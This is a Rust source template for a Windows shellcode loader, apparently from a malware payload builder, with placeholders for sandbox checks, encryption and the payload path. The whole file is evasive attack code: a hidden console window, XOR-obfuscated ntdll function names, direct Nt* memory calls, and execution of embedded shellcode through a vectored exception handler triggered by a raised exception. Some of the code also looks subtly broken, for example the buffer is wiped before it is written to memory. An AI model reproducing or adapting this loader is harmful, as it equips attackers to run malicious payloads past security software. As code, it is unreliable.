#![windows_subsystem = "windows"]
#![allow(non_snake_case)]
#![allow(dead_code)]

{{LITCRYPT_SETUP}}
{{COMMON_MODULE}}

use std::ffi::CString;
use std::ptr::null_mut;

use winapi::{
    um::{
        winnt::{MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE, MEM_RESERVE, EXCEPTION_CONTINUE_EXECUTION},
        libloaderapi::{GetModuleHandleA, GetProcAddress},
        errhandlingapi::AddVectoredExceptionHandler,
    },
    shared::{
        ntdef::{NT_SUCCESS, HANDLE},
    },
    ctypes::c_void,
};

{{IMPORTS}}

{{SANDBOX_IMPORTS}}

{{DECRYPTION_FUNCTION}}

// Obfuscated API names
const K: u8 = {{API_KEY}};
const OBF_NT_ALLOCATE_VIRTUAL_MEMORY: &[u8] = &{{OBF_NT_ALLOCATE_VIRTUAL_MEMORY}};
const OBF_NT_WRITE_VIRTUAL_MEMORY: &[u8] = &{{OBF_NT_WRITE_VIRTUAL_MEMORY}};
const OBF_NT_PROTECT_VIRTUAL_MEMORY: &[u8] = &{{OBF_NT_PROTECT_VIRTUAL_MEMORY}};
const OBF_NT_RAISE_EXCEPTION: &[u8] = &{{OBF_NT_RAISE_EXCEPTION}};

// Global to hold shellcode address for the VEH handler
static mut SHELLCODE_ADDR: *const u8 = null_mut();

extern "system" fn veh_handler(_exception_info: *mut c_void) -> i32 {
    unsafe {
        if !SHELLCODE_ADDR.is_null() {
            let shellcode_fn: extern "system" fn() = std::mem::transmute(SHELLCODE_ADDR);
            shellcode_fn();
        }
    }
    EXCEPTION_CONTINUE_EXECUTION
}

fn r(d: &[u8]) -> Vec<u8> {
    d.iter().map(|b| b ^ K).collect()
}

unsafe fn g(n: &[u8]) -> *const () {
    let ntdll = CString::new(lc!("ntdll")).unwrap();
    let h = GetModuleHandleA(ntdll.as_ptr());
    let s = r(n);
    let c = CString::new(s).unwrap();
    GetProcAddress(h, c.as_ptr()) as *const ()
}

type FnNtAllocateVirtualMemory = unsafe extern "system" fn(
    HANDLE,
    *mut *mut c_void,
    usize,
    *mut usize,
    u32,
    u32,
) -> i32;
type FnNtWriteVirtualMemory = unsafe extern "system" fn(
    HANDLE,
    *mut c_void,
    *mut c_void,
    usize,
    *mut usize,
) -> i32;
type FnNtProtectVirtualMemory = unsafe extern "system" fn(
    HANDLE,
    *mut *mut c_void,
    *mut usize,
    u32,
    *mut u32,
) -> i32;
type FnNtRaiseException = unsafe extern "system" fn(
    *mut c_void,
    *mut c_void,
    u32,
) -> i32;

fn allocate_rw_memory(size: usize) -> Option<*mut c_void> {
    let current_process: HANDLE = -1isize as HANDLE;

    unsafe {
        let f_alloc: FnNtAllocateVirtualMemory = std::mem::transmute(g(OBF_NT_ALLOCATE_VIRTUAL_MEMORY));

        let mut base: *mut c_void = null_mut();
        let mut alloc_size = size;

        let status = f_alloc(
            current_process,
            &mut base,
            0,
            &mut alloc_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if NT_SUCCESS(status) {
            Some(base)
        } else {
            None
        }
    }
}

fn write_to_memory(destination: *mut c_void, source: &[u8]) -> bool {
    let current_process: HANDLE = -1isize as HANDLE;

    unsafe {
        let f_write: FnNtWriteVirtualMemory = std::mem::transmute(g(OBF_NT_WRITE_VIRTUAL_MEMORY));

        let mut written: usize = 0;
        let status = f_write(
            current_process,
            destination,
            source.as_ptr() as *mut c_void,
            source.len(),
            &mut written,
        );

        NT_SUCCESS(status)
    }
}

fn change_protection_to_rx(address: *mut c_void, size: usize) -> bool {
    let current_process: HANDLE = -1isize as HANDLE;

    unsafe {
        let f_protect: FnNtProtectVirtualMemory = std::mem::transmute(g(OBF_NT_PROTECT_VIRTUAL_MEMORY));

        let mut old_protect: u32 = 0;
        let mut region_size = size;

        let status = f_protect(
            current_process,
            &mut address,
            &mut region_size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        NT_SUCCESS(status)
    }
}

unsafe fn register_veh_handler() -> bool {
    let result = AddVectoredExceptionHandler(1, Some(veh_handler));
    !result.is_null()
}

unsafe fn raise_exception() {
    let f_raise: FnNtRaiseException = std::mem::transmute(g(OBF_NT_RAISE_EXCEPTION));
    
    // EXCEPTION_INT_DIVIDE_BY_ZERO = 0xC0000094
    let _ = f_raise(
        0xC0000094 as *mut c_void,
        null_mut(),
        0,
    );
}

fn execute_via_veh(mut buf: Vec<u8>) {
    let base = allocate_rw_memory(buf.len());
    if base.is_none() {
        return;
    }

    let base = base.unwrap();
    common::wipe(&mut buf);

    if !write_to_memory(base, &buf) {
        return;
    }

    if !change_protection_to_rx(base, buf.len()) {
        return;
    }

    unsafe {
        SHELLCODE_ADDR = base as *const u8;
    }

    if !unsafe { register_veh_handler() } {
        return;
    }

    unsafe { raise_exception(); }
}

fn check_environment() -> bool {
    {{SANDBOX}}
    true
}

fn main() {
    {{SANDBOX}}

    if !check_environment() {
        return;
    }

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let vec: Vec<u8> = buf.to_vec();

    {{MAIN}}

    execute_via_veh(vec);
}

{{DLL_MAIN}}
